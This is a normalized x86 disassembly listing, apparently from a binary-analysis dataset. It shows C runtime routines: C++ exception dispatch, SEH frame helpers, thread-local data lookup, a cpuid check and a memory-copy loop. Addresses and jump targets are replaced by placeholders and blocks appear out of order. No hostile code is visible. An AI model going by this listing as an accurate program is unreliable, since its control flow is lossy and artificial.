mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_40b146
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_40b602
pop ecx
pop ecx
sub_40b8d9
push 0xc
push r--data
call sub_40c6e8
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40c32d
push ebx
push esi
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_40c966
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_40c980
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_40c966
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_40b656
pop ecx
pop ecx
push eax
push esi
call sub_40c980
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_40c72d
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_40b656
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_40ba58
push 0x8
push r--data
call sub_40c6e8
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_40b656
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_40ae7a
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_40b8d9
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c72d
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_40b656
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_40ae7a
jmp r-xdata
sub_40bae9
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_40ba58
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_40ae4a
call sub_40ae81
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_40b4dc
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_40b73d
add esp 0x28
test eax eax
je r-xdata
sub_40bb55
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_40c2c9
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_40c2c9
lea edi [ eax + 0x80 ]
call sub_40c0fc
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_40b0ab
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_40c32d
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40af39
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40bae9
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_40bc47
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_40c32d
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_40c2c9
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40c32d
jmp sub_40c2e1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40bb55
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_40c2c9
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_40c2c9
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_40c2c9
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_40c966
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_40b0ab
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_40c32d
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_40b602
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_40c2c9
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_40c2c9
mov edi [ eax + 0x94 ]
call sub_40c2c9
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_40b67b
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
test eax eax
mov [ ebp - 0x18 ] eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_40b67b
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_40c641
test al al
jne r-xdata
call sub_40c32d
cmp eax 0x19930522
jne r-xdata
call sub_40c2c9
call sub_40c2c9
call sub_40c2c9
mov [ eax + 0x88 ] esi
call sub_40c2c9
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_40b43c
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_40b602
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] rw-data
call sub_40c532
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] rw-data
call sub_40c91c
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_40bae9
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_40ae81
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40b4dc
add esp 0x10
push [ esi + 0x1c ]
call sub_40b6f4
sub_40bfb5
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_40c2c9
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_40bc47
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40b4dc
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40c099
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push rw-data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push rw-data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_40c105
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push rw-data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
push rw-data
push eax
call [ GetProcAddress@IAT ]
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_40c192
push 0xc
push r--data
call sub_40c6e8
push rw-data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] rw-data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov eax rw-data
mov [ esi + 0x68 ] eax
push eax
call [ InterlockedIncrement@IAT ]
push 0xc
call sub_40cdbd
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push rw-data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push rw-data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_40cf2e
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c23d
call sub_40c72d
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_40c246
push esi
push edi
call [ GetLastError@IAT ]
mov edi eax
call sub_40c168
push [ rw-data ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40d8d3
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_40c105
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_40d805
pop ecx
xor esi esi
push 0x0
push esi
call sub_40c192
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40c32d
push 0x8
push r--data
call sub_40c6e8
push [ rw-data ]
call sub_40c105
pop ecx
test eax eax
je r-xdata
jmp sub_40c2e1
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40c370
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_40dce4
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_40dce4
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40c414
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_40c3c4
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_40c481
push edi
mov edi [ esp + 0x8 ]
mov eax [ edi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ rw-data ] 0x0
push esi
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push [ rw-data ]
call sub_40c105
mov esi eax
test esi esi
pop ecx
je r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
push esi
call sub_40c966
test eax eax
pop ecx
je r-xdata
call sub_40c2e1
cmp eax 0x19930521
je r-xdata
push edi
call esi
jmp r-xdata
cmp eax 0x19930522
je r-xdata
pop esi
pop edi
retn 0x4
cmp eax 0x1994000
jne r-xdata
sub_40c532
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] rw-data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_40de90
mov esi eax
inc esi
push esi
call sub_40ddc3
test eax eax
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
push [ ebx ]
push esi
push eax
call sub_40dd0f
add esp 0xc
jmp r-xdata
sub_40c580
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] rw-data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_40de90
mov edi eax
inc edi
push edi
call sub_40ddc3
test eax eax
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_40dd0f
add esp 0xc
jmp r-xdata
sub_40c660
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40c6e8
push sub_40c750
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_40c750
sub esp 0x14
push ebx
mov ebx [ esp + 0x20 ]
push ebp
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
cmp eax 0xfffffffe
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x18 ] 0x1
lea edi [ ebx + 0x10 ]
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40acd2
mov eax [ esp + 0x28 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40acd2
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov ebp [ ebx + 0xc ]
cmp ebp 0xfffffffe
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov [ ebx - 0x4 ] edx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push rw-data
push edi
mov ecx ebx
mov edx 0xfffffffe
call sub_40e0c8
jmp r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
test ecx ecx
lea ebx [ esi + eax * 4 + 0x10 ]
mov eax [ ebx ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xfffffffe
mov ebp eax
jne r-xdata
mov edx edi
call sub_40e07e
test eax eax
mov [ esp + 0x13 ] 0x1
jl r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40acd2
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40acd2
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ esp + 0x28 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2c ]
call sub_40e0ae
mov eax [ esp + 0x2c ]
cmp [ eax + 0xc ] ebp
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebp
mov ecx eax
call sub_40e0c8
mov eax [ esp + 0x2c ]
push rw-data
call sub_40e152
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40acd2
mov ecx [ ebx + 0x8 ]
mov edx edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40acd2
mov edx [ esp + 0x28 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40dced
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40c8e6
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_40c91c
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi rw-data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
test eax eax
pop edi
mov [ ebp - 0x4 ] eax
pop esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_40c980
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40ca08 ]
jmp [ ecx * 4 + jump_table_40ca88 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40caf4 ]
pop esi
pop edi
pop ebp
jmp sub_40e245
jmp [ ecx * 4 + jump_table_40cc90 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40cb94 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40cc90 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40caf4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
